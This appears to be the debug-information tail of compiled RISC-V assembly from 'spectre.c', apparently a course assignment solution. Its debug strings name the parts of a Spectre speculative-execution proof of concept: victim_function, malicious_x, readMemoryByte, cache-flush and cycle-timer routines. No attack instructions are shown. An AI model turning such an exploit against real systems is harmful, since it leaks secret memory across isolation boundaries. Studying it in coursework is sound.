	.uleb128 0x2
	.byte	0x91
	.sleb128 -36
	.uleb128 0x1
	.4byte	.LASF36
	.byte	0x40
	.byte	0x7
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -40
	.uleb128 0x1
	.4byte	.LASF37
	.byte	0x40
	.byte	0x15
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -44
	.uleb128 0xa
	.8byte	.LBB2
	.8byte	.LBE2-.LBB2
	.4byte	0x34d
	.uleb128 0x3
	.string	"i"
	.byte	0x41
	.byte	0xc
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -48
	.byte	0
	.uleb128 0xb
	.8byte	.LBB3
	.8byte	.LBE3-.LBB3
	.uleb128 0x1
	.4byte	.LASF38
	.byte	0x44
	.byte	0xc
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -52
	.uleb128 0xa
	.8byte	.LBB4
	.8byte	.LBE4-.LBB4
	.4byte	0x38e
	.uleb128 0x3
	.string	"i"
	.byte	0x46
	.byte	0xe
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -56
	.byte	0
	.uleb128 0xa
	.8byte	.LBB5
	.8byte	.LBE5-.LBB5
	.4byte	0x3cf
	.uleb128 0x3
	.string	"j"
	.byte	0x4b
	.byte	0xe
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -60
	.uleb128 0xb
	.8byte	.LBB6
	.8byte	.LBE6-.LBB6
	.uleb128 0x3
	.string	"z"
	.byte	0x4d
	.byte	0x19
	.4byte	0x5d
	.uleb128 0x3
	.byte	0x91
	.sleb128 -108
	.byte	0
	.byte	0
	.uleb128 0xa
	.8byte	.LBB7
	.8byte	.LBE7-.LBB7
	.4byte	0x42c
	.uleb128 0x3
	.string	"i"
	.byte	0x5a
	.byte	0xe
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -64
	.uleb128 0xb
	.8byte	.LBB8
	.8byte	.LBE8-.LBB8
	.uleb128 0x1
	.4byte	.LASF39
	.byte	0x5b
	.byte	0xb
	.4byte	0x56
	.uleb128 0x3
	.byte	0x91
	.sleb128 -84
	.uleb128 0x1
	.4byte	.LASF40
	.byte	0x5d
	.byte	0x19
	.4byte	0xcd
	.uleb128 0x1
	.byte	0x59
	.uleb128 0x1
	.4byte	.LASF41
	.byte	0x5f
	.byte	0x19
	.4byte	0xcd
	.uleb128 0x1
	.byte	0x59
	.byte	0
	.byte	0
	.uleb128 0xb
	.8byte	.LBB9
	.8byte	.LBE9-.LBB9
	.uleb128 0x3
	.string	"i"
	.byte	0x67
	.byte	0xe
	.4byte	0x56
	.uleb128 0x3
	.byte	0x91
	.sleb128 -68
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x5
	.4byte	0xbc
	.uleb128 0x5
	.4byte	0x56
	.uleb128 0x6
	.4byte	0x56
	.4byte	0x467
	.uleb128 0x8
	.4byte	0x7c
	.byte	0xff
	.byte	0
	.uleb128 0x5
	.4byte	0xc8
	.uleb128 0x18
	.4byte	.LASF43
	.byte	0x1
	.byte	0x2f
	.byte	0xa
	.4byte	0xcd
	.8byte	.LFB5
	.8byte	.LFE5-.LFB5
	.uleb128 0x1
	.byte	0x9c
	.4byte	0x49d
	.uleb128 0x1
	.4byte	.LASF44
	.byte	0x30
	.byte	0xe
	.4byte	0xcd
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.uleb128 0x19
	.4byte	.LASF45
	.byte	0x1
	.byte	0x29
	.byte	0x6
	.8byte	.LFB4
	.8byte	.LFE4-.LFB4
	.uleb128 0x1
	.byte	0x9c
	.4byte	0x4ca
	.uleb128 0x10
	.string	"ptr"
	.byte	0x29
	.byte	0x16
	.4byte	0x9d
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.uleb128 0x1a
	.4byte	.LASF48
	.byte	0x1
	.byte	0x23
	.byte	0x6
	.8byte	.LFB3
	.8byte	.LFE3-.LFB3
	.uleb128 0x1
	.byte	0x9c
	.uleb128 0x10
	.string	"x"
	.byte	0x23
	.byte	0x1d
	.4byte	0x83
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.byte	0
	.section	.debug_abbrev,"",@progbits
.Ldebug_abbrev0:
	.uleb128 0x1
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0x21
	.sleb128 1
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x2
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.byte	0
	.byte	0
	.uleb128 0x3
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0x21
	.sleb128 1
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x4
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0x21
	.sleb128 1
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x5
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0x21
	.sleb128 8
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x6
	.uleb128 0x1
	.byte	0x1
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x7
	.uleb128 0x16
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x8
	.uleb128 0x21
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2f
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x9
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0x21
	.sleb128 1
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0xa
	.uleb128 0xb
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.byte	0
	.byte	0
	.uleb128 0xc
	.uleb128 0x5
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xd
	.uleb128 0x35
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xe
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0x21
	.sleb128 5
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0x21
	.sleb128 5
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3c
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xf
	.uleb128 0x18
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x10
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0x21
	.sleb128 1
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x11
	.uleb128 0x11
	.byte	0x1
	.uleb128 0x25
	.uleb128 0xe
	.uleb128 0x13
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0x1f
	.uleb128 0x1b
	.uleb128 0x1f
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x10
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x12
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0x8
	.byte	0
	.byte	0
	.uleb128 0x13
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x14
	.uleb128 0x26
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x15
	.uleb128 0x21
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2f
	.uleb128 0x6
	.byte	0
	.byte	0
	.uleb128 0x16
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x7c
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x17
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x7c
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x18
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x7a
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x19
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x7a
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x1a
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x7a
	.uleb128 0x19
	.byte	0
	.byte	0
	.byte	0
	.section	.debug_aranges,"",@progbits
	.4byte	0x2c
	.2byte	0x2
	.4byte	.Ldebug_info0
	.byte	0x8
	.byte	0
	.2byte	0
	.2byte	0
	.8byte	.Ltext0
	.8byte	.Letext0-.Ltext0
	.8byte	0
	.8byte	0
	.section	.debug_line,"",@progbits
.Ldebug_line0:
	.section	.debug_str,"MS",@progbits,1
.LASF26:
	.string	"sscanf"
.LASF8:
	.string	"__uint8_t"
.LASF31:
	.string	"value"
.LASF28:
	.string	"argv"
.LASF5:
	.string	"short unsigned int"
.LASF36:
	.string	"result1"
.LASF17:
	.string	"uint64_t"
.LASF30:
	.string	"score"
.LASF45:
	.string	"cbo_flush"
.LASF41:
	.string	"time2"
.LASF3:
	.string	"unsigned char"
.LASF39:
	.string	"mix_i"
.LASF19:
	.string	"unused1"
.LASF21:
	.string	"unused2"
.LASF10:
	.string	"long unsigned int"
.LASF24:
	.string	"temp"
.LASF34:
	.string	"addr"
.LASF11:
	.string	"size_t"
.LASF35:
	.string	"junk"
.LASF13:
	.string	"long double"
.LASF20:
	.string	"array1"
.LASF47:
	.string	"main"
.LASF32:
	.string	"results"
.LASF48:
	.string	"victim_function"
.LASF6:
	.string	"unsigned int"
.LASF15:
	.string	"long long unsigned int"
.LASF16:
	.string	"uint8_t"
.LASF44:
	.string	"time"
.LASF18:
	.string	"array1_size"
.LASF29:
	.string	"malicious_x"
.LASF12:
	.string	"long long int"
.LASF22:
	.string	"array2"
.LASF14:
	.string	"char"
.LASF37:
	.string	"result2"
.LASF25:
	.string	"printf"
.LASF4:
	.string	"short int"
.LASF40:
	.string	"time1"
.LASF43:
	.string	"rdcycle"
.LASF42:
	.string	"readMemoryByte"
.LASF23:
	.string	"secret"
.LASF38:
	.string	"tries"
.LASF7:
	.string	"long int"
.LASF9:
	.string	"__uint64_t"
.LASF33:
	.string	"training_x"
.LASF2:
	.string	"signed char"
.LASF46:
	.string	"GNU C17 14.2.0 -mabi=lp64 -mtune=rocket -misa-spec=20191213 -march=rv64imafdc_zicbom_zicsr_zifencei -g -O0"
.LASF27:
	.string	"argc"
	.section	.debug_line_str,"MS",@progbits,1
.LASF0:
	.string	"spectre.c"
.LASF1:
	.string	"/Users/cannedbeans/sharedlinuxdir/cdol/429-assignment-solutions/assignment-3"
	.ident	"GCC: (g04696df09) 14.2.0"
	.section	.note.GNU-stack,"",@progbits
